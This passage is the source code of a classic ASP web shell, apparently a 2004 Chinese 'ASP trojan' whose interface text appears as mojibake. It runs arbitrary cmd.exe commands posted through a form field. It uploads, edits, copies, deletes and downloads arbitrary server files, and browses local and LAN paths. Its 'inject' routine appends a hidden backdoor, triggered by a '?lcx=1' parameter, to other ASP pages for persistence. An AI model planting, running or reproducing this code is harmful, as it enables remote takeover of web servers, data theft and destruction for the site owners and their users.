   response.write "<a href='"&url&"?attrib=true'><font color='#d00000'>µã»÷ÇÐ»»µ½¾ø¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   end if
   %>&nbspÂ·¾¶: <%=cpath%>  &nbsp;&nbsp;µ±Ç°ä¯ÀÀÄ¿Â¼:<%=lpath%>
   </td></tr> <tr>
   <td height=22 colspan="4" bgcolor="#eeeeee" >
   <form name="form1" method="post" action="<%=url%>" >
   ä¯ÀÀÄ¿Â¼: <input type="text" name="path" size="30" value="c:">
   <input type="hidden" name="attrib" value="true">
   <input type="submit" name="submit" value="ä¯ÀÀÄ¿Â¼" > ¡¼ÇëÓÃ¾ø¶ÔÂ·¾¶,Ö§³Ö¾ÖÓòÍøµØÖ·£¡Èç"\\pc01\c"¡½
   <input type="submit" name="submit1" value="·µ»ØÃâfsoÒ³">
   </td></form>
   <%
   if request.form("submit1")="·µ»ØÃâfsoÒ³" then
   call out()
   end if%>
   </tr><tr >
   <td colspan="4" bgcolor="#eeeeee" ><form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
   ´«ÖÁ·þÎñÆ÷ÒÑÓÐÄ¿Â¼:
   <input name="filepath" type="text" value="drv:\path" size="15">
   ÎÄ¼þµØÖ·:
   <input type="file" name="file1" value="" size=4><input type="file" name="file2" value="" size=4>
   <input type="file" name="file3" value="" size=4>
   <input type="submit" name="submit" value="ÉÏ´«" > ¡¼ÇëÓÃ¾ø¶ÔÂ·¾¶¡½
   </td>
   </form></tr>
   <tr bgcolor="#eeeeee">
   <td colspan="4" >
   <%
   on error resume next
   dsnxa = request.form(".cmd")
   if (dsnxa <> "") then
   sztempfile = "c:\" & ofilesyslcx.gettempname( )
   call oscriptlcx.run ("cmd.exe /c " & dsnxa & " > " & sztempfile, 0, true)
   set ofilelcx = ofilesyslcx.opentextfile (sztempfile, 1, false, 0)
   end if%>
   <form action="<%= request.servervariables("url") %>" method="post" name=userdata>
   <input type=text name=".cmd" size=28 value="<%= dsnxa %>">
   <input type=submit value="cmdÃüÁî">
   <input type=text name='name' size=16 value="drive:\file.exe"><input type='button' name=send value="Ö´ÐÐ³ÌÐò">
   <input type=text name='name1' size=16 value="drive:\file.name"><input type='button' name=send1 value="É¾³ýÎÄ¼þ">¡¼¾ø¶ÔÂ·¾¶+ÎÄ¼þÃû¡½
   </td> </form>
   <script language=vbscript>
   sub send_onclick
   window.open("<%=url%>?run="+userdata.name.value+"&action=Ö´ÐÐ")
   end sub
   </script>
   <script language=vbscript>
   sub send1_onclick
   window.open("<%=url%>?filename="+userdata.name1.value+"&action=del")
   end sub
   </script>
   </tr>
   <tr bgcolor=#eeeeee>
   <td height=22 colspan="4" ><form name="newfile"
   onsubmit="return crfile(newfile.filename.value);">
   <input type="text" name="filename" size="40">
   <input type="submit" value="ÐÂ½¨ÎÄ¼þ" >
   <input type="button" value="ÐÂ½¨Ä¿Â¼"onclick="crdir(newfile.filename.value)">¡¼ÐÂ½¨ÎÄ¼þºÍÐÂ½¨Ä¿Â¼²»ÄÜÍ¬Ãû¡½
   </td></form>
   <pre>
   <% if (isobject(ofilelcx)) then
   on error resume next
   response.write server.htmlencode(ofilelcx.readall)
   ofilelcx.close
   call ofilesyslcx.deletefile(sztempfile, true)
   end if %>
   </tr>
   <tr>
   <td height=22 width="26%" rowspan="2" valign="top" bgcolor=#eeeeee >

   <%
   dim thefolder,thesubfolders
   if fsobrowse.folderexists(cpath)then
   set thefolder=fsobrowse.getfolder(cpath)
   set thesubfolders=thefolder.subfolders
   response.write"<a href='"&url&"?path="&request("oldpath")&"&attrib="&attrib&"'><font color='#ff8000'>¡ö</font>¡ü<font color='ff2222'>»ØÉÏ¼¶Ä¿Â¼</font></a><br>"
   for each x in thesubfolders%>
   <%response.write"<a href='"&url&"?path="&lpath&x.name&"&oldpath="&request("path")&"&attrib="&attrib&"'>©¸<font color='#ff8000'>¡ö</font>  "&x.name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.name&"')"&chr(34)&"><font color='#ff8000' >¡Á</font>É¾³ý</a><br>"
   next
   end if
   %>
   </td>
   <td  width="45%"  bgcolor=#eeeeee>ÎÄ¼þÃû £¨Êó±êÒÆµ½ÎÄ¼þÃû¿ÉÒÔ²é¿´¸øÎÄ¼þµÄÊôÐÔ£©</td>
   <td width="11%" bgcolor=#eeeeee>´óÐ¡£¨×Ö½Ú£©</td>
   <td width="18%" bgcolor=#eeeeee>ÎÄ¼þ²Ù×÷</td>
   </tr>
   <tr>
   <td height=200 colspan="3" valign="top" bgcolor=#eeeeee>
   <%
   dim thefiles
   if fsobrowse.folderexists(cpath)then
   set thefolder=fsobrowse.getfolder(cpath)
   set thefiles=thefolder.files
   response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
   for each x in thefiles
   if request("attrib")="true" then
   showstring="<strong>"&x.name&"</strong>"
   else
   showstring="<a href='"&lpath&x.name&"' title='"&"ÀàÐÍ"&x.type&chr(10)&"ÊôÐÔ"&x.attributes&chr(10)&"Ê±¼ä£º"&x.datelastmodified&"'target='_blank'><strong>"&x.name&"</strong></a>"
   end if
   response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#ff8000'>¡õ</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'><a href='"&url&"?id=edit&path="&lpath&x.name&"&attrib="&attrib&"' target='_blank' >&nbsp;edit</a><a href="&chr(34)&"javascript: copyfile('"&lpath&x.name&"')"&chr(34)&"><font color='#ff8000' ></font>&nbsp;copy</a><a href='"&url&"?id=edit&path="&lpath&x.name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;del</a><a href='"&url&"?id=down&path="&lpath&x.name&"&attrib="&attrib&"' target='_blank' >&nbsp;down</a><a href='"&url&"?id=inject&path="&lpath&x.name&"&attrib="&attrib&"' target='_blank' >&nbsp;inject</a></td></tr>"
   next
   end if
   response.write"</table>"
   %>
   </td>
   </tr></tbody>
   </table>
   <% end sub
   sub edit()
   if request("op")="del"  then
   '**********É¾³ýÎÄ¼þ********
   if request("attrib")="true" then
   whichfile=request("path")
   else
   whichfile=server.mappath(request("path"))
   end if
   set fs = createobject("scripting.filesystemobject")
   set thisfile = fs.getfile(whichfile)
   thisfile.delete true
   response.write "<br><center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û.</center>"
   '**********É¾³ýÎÄ¼þ½áÊø********
   else
   if request("op")="copy" then
   '**********¸´ÖÆÎÄ¼þ********
   if request("attrib")="true" then
   whichfile=request("path")
   dsfile=request("dpath")
   else
   whichfile=server.mappath(request("path"))
   dsfile=server.mappath(request("dpath"))
   end if
   set fs = createobject("scripting.filesystemobject")
   set thisfile = fs.getfile(whichfile)
   thisfile.copy dsfile
   response.write "<center><p>Ô´ÎÄ¼þ£º"+whichfile+"</center>"
   response.write "<center><br>Ä¿µÄÎÄ¼þ£º"+dsfile+"</center>"
   response.write "<center><br>¸´ÖÆ³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</p></center>"
   '**********¸´ÖÆÎÄ¼þ½áÊø********
   else
   if request.form("text")="" then
   if request("creat")<>"yes" then
   if request("attrib")="true" then
   whichfile=request("path")
   else
   whichfile=server.mappath(request("path"))
   end if
   set fs = createobject("scripting.filesystemobject")
   set thisfile = fs.opentextfile(whichfile, 1, false)
   counter=0
   thisline=thisfile.readall
   thisfile.close
   set fs=nothing
   end if
   %>
   <form method="post" action=""&url&"?id=edit">
   <input type="hidden" name="attrib" value="<%=request("attrib")%>">
   <br>
   <table cellspacing=1 cellpadding=3 width="750" align=center
   bgcolor=#b8b8b8 border=0 class="noborder">
   <tbody>
   <tr >
   <td
   height=22 bgcolor="#eeeeee" ><div align="center">º£Ñô¶¥¶ËÍøaspÄ¾Âí£À2004ÎÄ¼þ±à¼Æ÷</div></td>
   </tr>
   <tr >
   <td width="100%"
   height=22 bgcolor="#eeeeee" >ÎÄ¼þÃû£º
   <input type="text" name="path" size="45"
   value="<%=request("path")%>"readonly>
   </td>
   </tr>
   <tr>
   <td
   height=22 bgcolor="#eeeeee" > <div align="center">
   <textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
   </div></td>
   </tr>
   <tr>
   <td
   height=22 bgcolor="#eeeeee" ><div align="center">
   <input type="submit"
   value="Ìá½»" name="b1">
   <input type="reset" value="¸´Ô" name="b2">
   </div></td>
   </tr>
   </table>
   </form>
   <%else
   if request("attrib")="true" then
   whichfile=request("path")
   else
   whichfile=server.mappath(request("path"))
   end if
   set fs = createobject("scripting.filesystemobject")
   set outfile=fs.createtextfile(whichfile)
   outfile.writeline request("text")
   outfile.close
   set fs=nothing
   response.write "<center>ÐÞ¸Ä³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</center>"
   end if
   end if
   end if
   end sub
   end if
   %>
   <% sub dir()
   if request("op")="del"  then
   '***********É¾³ýÄ¿Â¼**********
   if request("attrib")="true" then
   whichdir=request("path")
   else
   whichdir=server.mappath(request("path"))
   end if
   set fs = createobject("scripting.filesystemobject")
   fs.deletefolder whichdir,true
   response.write "<center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û£¬É¾³ýµÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   '**********É¾³ýÄ¿Â¼½áÊø*************
   else
   '***********ÐÂ½¨Ä¿Â¼**********
   if request("op")="creat"  then
   if request("attrib")="true" then
   whichdir=request("path")
   else
   whichdir=server.mappath(request("path"))
   end if
   set fs = createobject("scripting.filesystemobject")
   fs.createfolder whichdir
   response.write "<center>½¨Á¢³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û,½¨Á¢µÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   '***********ÐÂ½¨Ä¿Â¼½áÊø**********
   end if
   end if
   end sub
   '****ÏÂÔØÎÄ¼þ
   function downloadfile(strfile)
   if  request("attrib")="" then
   strfilename = server.mappath(strfile)
   end if
   if  request("attrib")="true" then
   strfilename = request("path")
   end if
   response.buffer = true
   response.clear
   set s = server.createobject("adodb.stream")
   s.open
   s.type = 1
   on error resume next
   set fso = server.createobject("scripting.filesystemobject")
    if not fso.fileexists(strfilename) then
     response.write("<h1>error:</h1>" & strfilename & " does not exist<p>")
     response.end
    end if
    set f = fso.getfile(strfilename)
    intfilelength = f.size
   s.loadfromfile(strfilename)
    if err then
     response.write("<h1>error: </h1>" & err.description & "<p>")
     response.end
    end if
    response.addheader "content-disposition", "attachment; filename=" & f.name
    response.addheader "content-length", intfilelength
    response.charset = "utf-8"
    response.contenttype = "application/octet-stream"
     response.binarywrite s.read
    response.flush
    s.close
    set s = nothing
    response.end
   end function
   function out()
   session("password")=""
   response.redirect ""&co&""
   response.end
   end function

   %>
   <%
   sub inject()
   if request("id")="inject"  and request("attrib")<>"true"then
   testfile=server.mappath(""&request("path")&"")
   set fs=server.createobject("scripting.filesystemobject")
   set thisfile=fs.opentextfile(testfile,8,true,0)
   thisfile.writeline("<%")
   thisfile.writeline("if request(""lcx"")=""1"" then")
   thisfile.writeline("dim allen,creat,text,thisline,path")
   thisfile.writeline("if request(""creat"")=""yes"" then")
   thisfile.writeline("set fs = createobject(""scripting.filesystemobject"") ")
   thisfile.writeline("set outfile=fs.createtextfile(server.mappath(request(""path"")))")
   thisfile.writeline("outfile.writeline request(""text"")")
   thisfile.writeline("response.write ""succeed!""")
   thisfile.writeline("end if")
   thisfile.writeline("response.write ""<form method='post'action='""&request.servervariables(""url"")&""?lcx=1&creat=yes'>""")
   thisfile.writeline("response.write ""<textarea name='text'>""&thisline&""</textarea><br>""")
   thisfile.writeline("response.write ""<input type='text' name='path' value='""&request(""path"")&""'>""")
   thisfile.writeline("response.write ""<input name='submit' type='submit' value='ok' ></form>""")
   thisfile.writeline("response.end")
   thisfile.writeline("end if ")
   thisfile.writeline("%" & ">")
   thisfile.close
   response.write "succeed!ÇëÓÃ"&request("path")&"?lcx=1À´·ÃÎÊÄã²åÈëµÄÎÄ¼þ"
   else
   response.write "<form method='post' action='"&request.servervariables("url")&"?id=inject'>"
   response.write "<input type='text' name='path' readonly value='"&request("path")&"'>"
   response.write "<input name='submit' type='submit' value='ÕâÀïÄã²åÈëÊ²Ã´Ñ½£¬ËüÊÇÎïÀíÄ¿Â¼ÎÄ¼þÁË' ></form>"
   end if
   end sub
   %>
   <%
   searchstring = request("searchstring")
   count=0
   '°Ñµ±Ç°Ä¿Â¼µÄÊµ¼ÊÂ·¾¶×ª»»ÎªÐéÄâÂ·¾¶
   'function unmappath( path )
   'unmappath = replace(mid(path, len(server.mappath("/")) + 1), "\", "/")
   'end function
   function searchfile( f, s, title )
   set fo = fs.opentextfile(f)
   content = fo.readall'¶ÁÈ«²¿ÎÄ±¾µ½content
   fo.close
   searchfile = instr(1, content, s, vbtextcompare) > 0 '´ÓµÚÒ»¸ö×Ö·û¿ªÊ¼¼ì²écontentÀïÃæÊÇ·ñÓÐs
   if searchfile then'Èç¹ûÓÐ,ÔòÌá³öÎÄ¼þtitle´æÈë±äÁ¿
   pos1 = instr(1, content, "<title>", vbtextcompare)
   pos2 = instr(1, content, "</title>", vbtextcompare)
   title = ""
   if pos1 > 0 and pos2 > 0 then'È¡title±ê¼ÇÖÐ¼äµÄ×Ö·û
   title = mid( content, pos1 + 7, pos2 - pos1 - 7 )
   end if
   end if
   end function
   function filelink( f, title )
   vpath =f.path'È¡Â·¾¶
   if title = "" then title = f.name'×öÁ´½Ó
   'filelink = "<a href=""" & vpath & """>" & title & "</a>"
   filelink = vpath
   filelink = "<ul>¡¤" & filelink & "</ul>"
   end function
   sub searchfolder( fd, s )
   found = false
   for each f in fd.files
   pos = instrrev(f.path, "." )
   if pos > 0 then
   ext = mid(f.path, pos + 1 )
   else
   ext = ""
   end if
   if lcase(ext) = "asp" or lcase(ext) = "asa" or lcase(ext) = "cer" then'
   if searchfile( f, s, title ) then
   response.write filelink(f, title)
   count=count+1
   end if
   end if
   next
   for each sfd in fd.subfolders
   searchfolder sfd, s
   next
   end sub
   %>
   <br>
   <center>¾¯¸æ£º¶Ô·Ç·¨Ê¹ÓÃ´Ë³ÌÐò¿ÉÄÜ´øÀ´µÄÈÎºÎ²»Á¼ºó¹ûÔðÈÎ×Ô¸º£¡º£Ñô¶¥¶ËÍø<br></center>
   <center>¸ÐÐ»£ºÍø³½ÔÚÏß¡¢»¯¾³ÉÏ´«¡¢czy¡¢¼°cmd.asp×÷Õß¡¢sun.cËù×öµÄÒ»ÇÐÅ¬Á¦¡ôlcx&allen¡ô</center>
   <center><form action="<%= request.servervariables("url") %>" method="get">
   ¹Ø¼ü×ÖËÑË÷£º <input type="text" size="12" name="searchstring" value="<%=searchstring%>"> <input type="text" size="12" name="path88" value=ÎïÀíÂ·¾¶Ïñc:\><input
   type="submit" value="¿ÉÓÃÓÚ¼ìË÷´æÔÚµÄaspÄ¾Âí">
   </form><%
   set fs = server.createobject("scripting.filesystemobject")
   set fd = fs.getfolder(request("path88")&"\")
   if searchstring <> "" then
   response.write "<h2>ÈçÏÂÎÄ¼þÄÚÇ¶ÈëËÑË÷µÄ<font color=red>" & searchstring & "</font>¹Ø¼ü×Ö£º</h2><p>"
   searchfolder fd,searchstring
   end if
   %></center></body>
   </html>

   ÿ
